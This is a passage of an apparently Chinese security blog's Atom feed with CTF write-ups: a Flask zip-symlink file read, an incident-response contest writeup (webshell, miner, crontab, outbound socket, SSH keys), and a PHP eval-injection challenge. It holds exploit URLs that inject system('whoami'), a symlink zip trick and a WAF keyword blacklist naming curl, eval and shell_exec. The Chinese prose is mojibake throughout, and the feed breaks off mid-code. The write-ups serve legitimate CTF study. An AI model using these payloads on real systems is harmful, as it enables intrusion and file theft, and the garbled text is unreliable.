<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Polo&#39;s Blog</title>
  
  
  <link href="https://polosec.github.io/atom.xml" rel="self"/>
  
  <link href="https://polosec.github.io/"/>
  <updated>2021-11-25T07:41:15.416Z</updated>
  <id>https://polosec.github.io/</id>
  
  <author>
    <name>Polo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ä¸€é“ç®€å•çš„flask-webé¢˜</title>
    <link href="https://polosec.github.io/2021/11/25/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84flask-web%E9%A2%98/"/>
    <id>https://polosec.github.io/2021/11/25/%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84flask-web%E9%A2%98/</id>
    <published>2021-11-25T07:36:34.000Z</published>
    <updated>2021-11-25T07:41:15.416Z</updated>
    
    <content type="html"><![CDATA[<p>PKUçš„ä¸€é“ç®€å•flask webé¢˜ æ„Ÿè§‰æŒºæœ‰æ„æ€çš„<br>ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> shutil <span class="keyword">import</span> copyfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,url_for,send_from_directory,make_response,redirect</span><br><span class="line"><span class="keyword">from</span> werkzeug.middleware.proxy_fix <span class="keyword">import</span> ProxyFix</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line">os.environ[<span class="string">&#x27;TEMP&#x27;</span>]=<span class="string">&#x27;/dev/shm&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(<span class="string">&quot;access&quot;</span>)</span><br><span class="line">app.wsgi_app = ProxyFix(app.wsgi_app, x_for=<span class="number">1</span> ,x_proto=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        os.system(<span class="string">&quot;rm -rf /dev/shm/zip/media/*&quot;</span>)</span><br><span class="line">        path=os.path.join(<span class="string">&quot;/dev/shm/zip/media&quot;</span>,<span class="string">&#x27;tmp.zip&#x27;</span>)<span class="comment"># æ‹¼æ¥æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        f.save(path)</span><br><span class="line">        os.system(<span class="string">&#x27;timeout -k 1 3 unzip /dev/shm/zip/media/tmp.zip -d /dev/shm/zip/media/&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;rm /dev/shm/zip/media/tmp.zip&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/media/&#x27;</span>)</span><br><span class="line">    response = render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/media/&lt;path&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">media</span>(<span class="params">path=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    npath=os.path.join(<span class="string">&quot;/dev/shm/zip/media&quot;</span>,path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(npath):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;404&quot;</span>,<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(npath):</span><br><span class="line">        f=<span class="built_in">open</span>(npath,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        response = make_response(f.read())</span><br><span class="line">        response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fn=os.listdir(npath)</span><br><span class="line">        fn=[<span class="string">&quot;..&quot;</span>]+fn</span><br><span class="line">        f=<span class="built_in">open</span>(<span class="string">&quot;templates/template.html&quot;</span>)</span><br><span class="line">        x=f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        ret=<span class="string">&quot;&lt;h1&gt;æ–‡ä»¶åˆ—è¡¨:&lt;/h1&gt;&lt;br&gt;&lt;hr&gt;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> fn:</span><br><span class="line">            tpath=os.path.join(<span class="string">&#x27;/media/&#x27;</span>,path,i)</span><br><span class="line">            ret+=<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+tpath+<span class="string">&quot;&#x27;&gt;&quot;</span>+i+<span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span></span><br><span class="line">        x=x.replace(<span class="string">&quot;HTMLTEXT&quot;</span>,ret)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;mkdir /dev/shm/zip&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;mkdir /dev/shm/zip/media&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8080</span>,debug=<span class="literal">False</span>,threaded=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¤§æ„ä¸ºç”¨æˆ·ä¸Šä¼ ä¸€ä¸ªzipå‹ç¼©åŒ…ï¼ŒæœåŠ¡å™¨ç«¯è§£å‹åæ˜¾ç¤ºå‹ç¼©åŒ…å†…çš„å†…å®¹å¹¶ä¸”å¯ä»¥ä¸‹è½½<img src="http://cdn.polowong.top/1637825858176qkyykata.png?imageslim" alt="paste image">ç±»ä¼¼è¿™æ ·ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨Linuxçš„è½¯é“¾æ¥å®ç°æ–‡ä»¶è¯»å–<img src="http://cdn.polowong.top/1637825912925e5ctiogo.png?imageslim" alt="paste image">ä¸‹é¢åˆ¶ä½œä¸€ä¸ªå­˜åœ¨è½¯è¿æ¥çš„zipå‹ç¼©åŒ…</p><p>zip flag.zip flag â€“symlinks</p><p><img src="http://cdn.polowong.top/1637826007843qmy578le.png?imageslim" alt="paste image">ç›´æ¥ä¸‹è½½æ–‡ä»¶å¾—åˆ°è¯»å–çš„flagæ–‡ä»¶</p><p>flag{NeV3r_trUSt_Any_C0mprEsSEd_File}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PKUçš„ä¸€é“ç®€å•flask webé¢˜ æ„Ÿè§‰æŒºæœ‰æ„æ€çš„&lt;br&gt;ä»£ç å¦‚ä¸‹&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>å¹¿ä¸œçœå¼ºç½‘æ¯è¿ç»´èµ›éƒ¨åˆ†WP</title>
    <link href="https://polosec.github.io/2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/"/>
    <id>https://polosec.github.io/2021/11/15/%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%BF%90%E7%BB%B4%E8%B5%9B%E9%83%A8%E5%88%86WP/</id>
    <published>2021-11-15T12:45:56.000Z</published>
    <updated>2021-11-15T13:41:41.374Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸Šå‘¨æœ«æ‰“äº†å¼ºç½‘æ¯ï¼ŒæŸèµ›é“æ‰“äº†ç¬¬ä¸‰åæ‹¿äº†äºŒç­‰å¥–ï¼Œä¸Šåˆæ˜¯è¿ç»´èµ›ï¼Œä¸‹åˆæ˜¯awdã€‚<br>ä¸Šåˆçš„è¿ç»´èµ›å‡ºçš„è¿˜å¯ä»¥ï¼Œæˆ‘è§‰å¾—éš¾åº¦ç›¸å¯¹ä½ä¸€ç‚¹ï¼Œä¸€å…±12é“é¢˜ï¼Œåˆ°æœ€ååŸºæœ¬æœ‰ä¸€åŠçš„äººèƒ½åšå‡ºæ¥6-8é“å·¦å³ï¼Œæœ¬èµ›é“ç¬¬ä¸‰-å…«åå…¨éƒ¨æ˜¯8é“é¢˜ã€‚è¿™æ¬¡æ‹¿å¥–å¾—äºäº†æœ‰pwnğŸ‘´å»ä¿®é¢˜ï¼Œæˆ‘webåº”æ€¥å“åº”åšçš„ä¸å¦‚åˆ«äººå¤šã€‚</p><p>åæ§½ï¼šä¸‹åˆçš„AWDçº¯è„‘ç˜«ï¼Œå‚èµ›æ‰‹å†Œå†™çš„æ˜¯AWDPï¼Œèµ›åˆ¶ä»‹ç»åˆ™æ˜¯AWDã€‚ä¸ä¸€è‡´ä¹Ÿå°±ç®—äº†ï¼Œä¸‹åˆAWDåªç»™ä¸€é“å·¨éš¾çš„pwnæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿæœ€åæ”¾hintè¿expéƒ½å¿«æ”¾å®Œäº†ï¼Œæœ€ååªæœ‰é«˜æ ¡ç»„æœ‰1-2æ”¯é˜Ÿä¼åœ¨æ‰“ï¼Œå…¶ä»–èµ›é“å…¨åœ¨ç½šåã€‚</p><h1 id="webè¿ç»´"><a href="#webè¿ç»´" class="headerlink" title="webè¿ç»´"></a>webè¿ç»´</h1><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><p>æœ‰ä¸€ä¸ªå­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„é¡µé¢ï¼Œå¤§ä½“æ„æ€å°±æ˜¯ä¼ å…¥å‚æ•°ä¹‹åååºåˆ—åŒ–è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œé¢˜ç›®æœ¬èº«ç»™äº†wafï¼Œåªä¸è¿‡å…³é”®è¯æ¯”è¾ƒå°‘ã€‚å¦‚ blacklist=â€™\php|flag|system|&#39;;è‡ªå·±åŠ ä¸€äº›å…³é”®å­—å°±å¥½äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|file_get_contents|fwrite|curl|system|eval|shell_exec|cat|tac|more|flag|base64|assert|passthru|readfile|php\:\/\/|file\:\/\/|fread|create\_function|php|script|\&lt;\?php|\&#x27;|\&quot;|\(|\)|\&amp;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$back_list</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$back_list</span> <span class="keyword">as</span> <span class="variable">$hack</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/<span class="subst">$hack</span>/i&quot;</span>, <span class="variable">$query</span>))  <span class="comment">// å‡è®¾ç”¨æˆ·è¾“å…¥çš„å‚æ•°æ˜¯ $query</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hack detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤šåŠ äº†å‡ ä¸ªå…³é”®å­—è¿™é¢˜çš„checkå°±è¿‡äº†</p><h2 id="ä¸æ­»é©¬"><a href="#ä¸æ­»é©¬" class="headerlink" title="ä¸æ­»é©¬"></a>ä¸æ­»é©¬</h2><p> ls -all çœ‹äº†ä¸€ä¸‹æœ‰.2.phpï¼Œæˆ‘ç›´æ¥ rm -rf åˆ å®Œä¹‹åè¿™ä¸ªcheckç‚¹è¿˜æ˜¯æ²¡æœ‰è¿‡ï¼Œä¹‹ååˆllçœ‹äº†ä¸‹å‘ç°æ˜¯ä¸æ­»é©¬ã€‚<br> æ€ä¸æ­»é©¬æœ‰2ç§æ€è·¯ï¼Œç¬¬ä¸€ç§æ˜¯å†™è„šæœ¬æ— é™å¾ªç¯åˆ é™¤ï¼Œpythonæˆ–è€…shellæˆ–è€…phpè„šæœ¬éƒ½å¯ä»¥ï¼Œç¬¬äºŒç§æ˜¯é‡å¯php-fpmæœåŠ¡ã€‚è¿™æ¬¡ç»™çš„æƒé™æ¯”è¾ƒé«˜ï¼Œæ˜¯rootï¼Œå¯ä»¥ç›´æ¥é‡å¯ã€‚ä½†æ˜¯åœ¨å¤§éƒ¨åˆ†awdæ¯”èµ›ä¸­å¯èƒ½æ²¡æœ‰é‡å¯æœåŠ¡çš„æƒé™ï¼Œæ‰€ä»¥ç¬¬ä¸€ç§æ€è·¯æ˜¯å¿…è¡Œçš„ã€‚<br> é™„è„šæœ¬<br> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">rm -rf .3.php;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;remove success&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><br>ä¸Šä¼ ä¸Šå»ä¹‹åchmod u+x 1.sh ç„¶å nohup ./1.sh &amp;æŒ‚ç€è·‘å°±å¯ä»¥äº†ã€‚</p><h2 id="phpinfoä¿¡æ¯æ³„éœ²"><a href="#phpinfoä¿¡æ¯æ³„éœ²" class="headerlink" title="phpinfoä¿¡æ¯æ³„éœ²"></a>phpinfoä¿¡æ¯æ³„éœ²</h2><p>æ²¡å•¥å¥½è¯´çš„ï¼Œåˆ äº†å°±è¡Œã€‚</p><h2 id="åé—¨"><a href="#åé—¨" class="headerlink" title="åé—¨"></a>åé—¨</h2><p>æŠŠæºç æä¸‹æ¥æ”¾åˆ°Dç›¾æŸ¥æ€ï¼ŒæŸ¥åˆ°äº†åé—¨ï¼Œç›´æ¥åˆ æ‰å°±å¥½ï¼Œè¿˜æœ‰XXEï¼Œæ–‡ä»¶ä¹Ÿæ˜¯ç›´æ¥åˆ æ‰å°±å¥½ã€‚</p><h1 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h1><h2 id="æŒ–çŸ¿"><a href="#æŒ–çŸ¿" class="headerlink" title="æŒ–çŸ¿"></a>æŒ–çŸ¿</h2><p>webå°±é‚£ä¹ˆå‡ é“é¢˜æˆ‘æ˜¯å¦¹æƒ³åˆ°çš„ï¼Œæˆ‘ä»¥ä¸ºåé¢è¿˜ä¼šæ”¾é¢˜ï¼Œä¸“é—¨é—®äº†ä¸»åŠæ–¹ï¼Œä¸»åŠæ–¹è¯´ä¸€æ¬¡æ”¾å®Œï¼Œå¥½å§ï¼Œé‚£ä¼°è®¡æ˜¯è¦åœ¨å…¶ä»–åœ°æ–¹æ‰¾patchç‚¹äº†ã€‚topçœ‹äº†ä¸€ä¸‹ï¼Œæœ‰ä¸€ä¸ªè¿›ç¨‹çš„cpuåˆ©ç”¨ç‡è¿‡é«˜ï¼Œåœ¨/home/ctf/mxxxç›®å½•ä¸‹ï¼ˆå…·ä½“ç›®å½•åç§°è®°ä¸æ¸…äº†ï¼‰æ˜¯ä¸€ä¸ªelfæ–‡ä»¶ï¼ŒåŒç›®å½•ä¸‹è¿˜æœ‰jsonçš„é…ç½®æ–‡ä»¶ï¼Œç›´è§‰å‘Šè¯‰æˆ‘æ˜¯æŒ–çŸ¿ã€‚æŒ–çŸ¿ç¨‹åºå¸¸åœ¨tmpç›®å½•å†™ç‚¹ä¸œè¥¿ï¼Œè¿™é‡Œçš„æ“ä½œå°±æ˜¯é¦–å…ˆå¹²æ‰æŒ–çŸ¿è¿›ç¨‹ï¼Œç„¶ååˆ æ‰æŒ–çŸ¿ç¨‹åºä»¥åŠtmpç›®å½•ä¸‹å¯¹åº”çš„å†…å®¹ï¼Œç„¶åæŸ¥çœ‹crontabé˜²æ­¢å†æ¬¡ä¸‹è½½ä¸è‡ªå¯åŠ¨ã€‚</p><h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><p>crontabè¿™é¢˜æˆ‘åº”è¯¥æ˜¯å¦¹åšå‡ºæ¥ï¼Œå¼‚å¸¸ç‚¹æ˜¯ctfç”¨æˆ·çš„crontabï¼Œæˆ‘æ˜¯rootç”¨æˆ·ã€‚çœ‹äº† /var/spool/cron/crontabsæ²¡çœ‹åˆ°å•¥ä¸œè¥¿,å°±æ²¡åœ¨çœ‹ã€‚èµ›åå¸ˆå‚…è¯´äº†ä¸‹ crontab -user -l ä¹Ÿå¯ä»¥çœ‹æŒ‡å®šç”¨æˆ·çš„crontabã€‚ã€‚å­¦åˆ°äº†</p><h2 id="å¤–è¿socket"><a href="#å¤–è¿socket" class="headerlink" title="å¤–è¿socket"></a>å¤–è¿socket</h2><p>netstat -antlp ä¹‹åå‘ç°æœ‰å‘9999ç«¯å£å¤–è¿çš„è¡Œä¸ºï¼Œç„¶åps aux å’Œps ef ä¹‹åçœ‹åˆ°äº†å‘½ä»¤ç±»ä¼¼ sh -c python3 -c â€œ__import__(â€˜osâ€™).system(â€˜xxxxxxâ€™)â€ã€‚å¯ä»¥ç¡®å®šæ˜¯è¿™äº›è¿›ç¨‹å»ºç«‹äº†socketè¿æ¥ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°å…·ä½“æ˜¯è°èµ·äº†è¿™äº›è¿›ç¨‹â€¦å°±å¾ˆæ— å¥ˆï¼Œæ€ä¹Ÿæ€ä¸æ‰ï¼Œè¿™é‡Œæˆ‘çš„å¤„ç†æ–¹æ³•æ˜¯æŠŠpython3çš„è½¯è¿æ¥ç»™å¹²æ‰äº†ã€‚å› ä¸ºé€šè¿‡è§‚å¯Ÿè¿›ç¨‹å‘ç°é™¤äº†è¿™äº›å¤–è¿çš„æ²¡æœ‰ç”¨py3èµ·çš„è¿›ç¨‹ã€‚è¿™é‡Œå…¶å®æ˜¯æœ‰ä¸ªsoæ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼Œåé¢pwnçš„é˜Ÿå‹ä¿®å¤çš„ã€‚</p><h2 id="sshå…¬é’¥"><a href="#sshå…¬é’¥" class="headerlink" title="sshå…¬é’¥"></a>sshå…¬é’¥</h2><p>ssh å…å¯†ç™»å½•å­˜æ”¾çš„å…¬é’¥åœ¨~/.ssh/authorized_keysæ–‡ä»¶é‡Œé¢ï¼Œç”±äºæˆ‘ä»¬æ˜¯ç§é’¥ç™»å½•ï¼Œä½†æ˜¯é‡Œé¢æœ‰ä¸‰ä¸ªå…¬é’¥ï¼Œæˆ‘ä»¬åªä¿ç•™äº†æˆ‘ä»¬ç§é’¥å¯¹åº”çš„å…¬é’¥ï¼Œå…¶ä»–å…¬é’¥å…¨ç»™åˆ äº†ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ¬¡è¿ç»´èµ›ç›¸å¯¹åŸºç¡€ï¼Œå°±å½“æ¸©ä¹ ä¸€ä¸‹åº”æ€¥å“åº”äº†ã€‚æ¯•ç«Ÿåªæ­£ç»åšè¿‡ä¸€æ¬¡ï¼šï¼‰</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸Šå‘¨æœ«æ‰“äº†å¼ºç½‘æ¯ï¼ŒæŸèµ›é“æ‰“äº†ç¬¬ä¸‰åæ‹¿äº†äºŒç­‰å¥–ï¼Œä¸Šåˆæ˜¯è¿ç»´èµ›ï¼Œä¸‹åˆæ˜¯awdã€‚&lt;br&gt;ä¸Šåˆçš„è¿ç»´èµ›å‡ºçš„è¿˜å¯ä»¥ï¼Œæˆ‘è§‰å¾—éš¾åº¦ç›¸å¯¹ä½ä¸€ç‚¹ï¼Œä¸€å…±12é“é¢˜ï¼Œåˆ°æœ€ååŸºæœ¬æœ‰ä¸€åŠçš„äººèƒ½åšå‡ºæ¥6-8é“å·¦å³ï¼Œæœ¬èµ›é“ç¬¬ä¸‰-å…«åå…¨éƒ¨æ˜¯8é“é¢˜ã€‚è¿™æ¬¡æ‹¿å¥–å¾—äºäº†æœ‰pwnğŸ‘´å»ä¿®é¢˜ï¼Œæˆ‘webåº”æ€¥å“åº”åšçš„ä¸å¦‚åˆ«</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ä¸¤é“ç®€å•ctf-php-webé¢˜</title>
    <link href="https://polosec.github.io/2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/"/>
    <id>https://polosec.github.io/2021/11/06/%E4%B8%A4%E9%81%93%E7%AE%80%E5%8D%95ctf-web%E9%A2%98/</id>
    <published>2021-11-05T16:26:30.000Z</published>
    <updated>2021-11-05T16:32:23.106Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">String2Array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span> == <span class="string">&#x27;&#x27;</span>) <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">&quot;\$array = <span class="subst">$data</span>;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$attrid</span>) &amp;&amp; is_array(<span class="variable">$attrvalue</span>))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;array(&#x27;</span>;</span><br><span class="line">        <span class="variable">$attrids</span> = count(<span class="variable">$attrid</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$attrids</span>; <span class="variable">$i</span>++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$attrstr</span> .= <span class="string">&#x27;&quot;&#x27;</span>.intval(<span class="variable">$attrid</span>[<span class="variable">$i</span>]).<span class="string">&#x27;&quot;=&gt;&#x27;</span>.<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$attrvalue</span>[<span class="variable">$i</span>].<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$i</span> &lt; <span class="variable">$attrids</span>-<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$attrstr</span> .= <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$attrstr</span> .= <span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String2Array(<span class="variable">$attrstr</span>);</span><br><span class="line">â€‹```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æ³¨æ„ç‚¹ï¼šextractå¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œ<span class="keyword">eval</span>é‚£å¥è¯æ˜¯æŠŠå­—ç¬¦ä¸²æ•°ç»„æ ¼å¼è½¬ä¸ºçœŸæ­£çš„æ•°ç»„ã€‚</span><br><span class="line">exp:</span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1/test.io/index.php?attrvalue%5B0%5D=2%22);system(%27whoami%27);//&amp;attrid%5B0%5D=1">http://127.0.0.1/test.io/index.php?attrvalue[0]=2%22);system(%27whoami%27);//&amp;attrid[0]=1</a><br><a href="http://127.0.0.1/test.io/index.php?attrvalue%5B0%5D=1&amp;attrid%5B0%5D=2&amp;attrstr=phpinfo()">http://127.0.0.1/test.io/index.php?attrvalue[0]=1&amp;attrid[0]=2&amp;attrstr=phpinfo()</a>;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(&#39;0&#39;);</span><br><span class="line">$str1 &#x3D; $_GET[&#39;str1&#39;];</span><br><span class="line">$str2 &#x3D; $_GET[&#39;str2&#39;];</span><br><span class="line">function waf($str)</span><br><span class="line">&#123;</span><br><span class="line">$blacklist&#x3D;&#39;&#x2F;phpinfo|passthru&#x2F;i&#39;;</span><br><span class="line">    if 